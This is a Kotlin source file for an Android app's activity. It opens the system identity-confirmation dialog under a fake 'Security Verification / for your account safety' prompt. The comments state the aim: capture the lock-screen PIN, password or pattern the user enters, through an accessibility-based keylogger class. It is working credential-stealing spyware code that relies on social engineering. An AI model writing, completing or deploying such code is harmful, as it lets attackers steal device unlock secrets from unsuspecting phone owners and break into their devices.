package com.zaka.screenagent.pin

import android.app.Activity
import android.app.KeyguardManager
import android.content.Intent
import android.os.Bundle
import android.util.Log
import com.zaka.screenagent.keylog.PinCapture

/**
 * 主动模式：**弹系统「验证身份」密码框**（不锁屏、不影响指纹面容）。
 * 对应 2.2 的 `ConfirmDeviceActivity`：
 *   KeyguardManager.createConfirmDeviceCredentialIntent(title, desc)
 *
 * 用户在这个系统弹窗里输入 PIN/密码/图案时，由无障碍（PinCapture）捕获。
 */
class ConfirmCredentialActivity : Activity() {

    companion object {
        private const val TAG = "ConfirmCred"
        private const val REQ = 1001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            val km = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
            if (km == null) { finish(); return }
            val intent = km.createConfirmDeviceCredentialIntent(
                "Security Verification",
                "For your account safety, please verify your identity"
            )
            if (intent == null) {
                Log.w(TAG, "no lock screen credential set, skip")
                finish()
                return
            }
            PinCapture.beginCapture(this)
            @Suppress("DEPRECATION")
            startActivityForResult(intent, REQ)
        } catch (e: Exception) {
            Log.e(TAG, "start failed", e)
            finish()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ) {
            Log.d(TAG, "result=$resultCode")
            PinCapture.finishCapture(this, resultCode == RESULT_OK)
        }
        finish()
    }

    override fun onBackPressed() {
        PinCapture.finishCapture(this, false)
        finish()
    }
}
